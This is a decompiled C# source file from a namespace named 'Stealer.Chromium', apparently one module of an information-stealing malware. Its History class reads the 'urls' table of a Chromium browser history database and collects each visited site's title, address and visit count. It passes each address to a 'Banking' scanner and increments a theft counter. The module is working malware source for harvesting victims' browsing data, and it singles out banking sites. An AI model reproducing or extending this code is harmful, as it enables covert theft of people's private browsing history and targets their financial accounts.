using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000034 RID: 52
	internal sealed class History
	{
		// Token: 0x060000E3 RID: 227 RVA: 0x00008054 File Offset: 0x00006254
		public static List<Site> Get(string sHistory)
		{
			List<Site> result;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "urls");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site item = default(Site);
						item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
						Banking.ScanData(item.sUrl);
						Counter.History++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Site>();
			}
			return result;
		}
	}
}
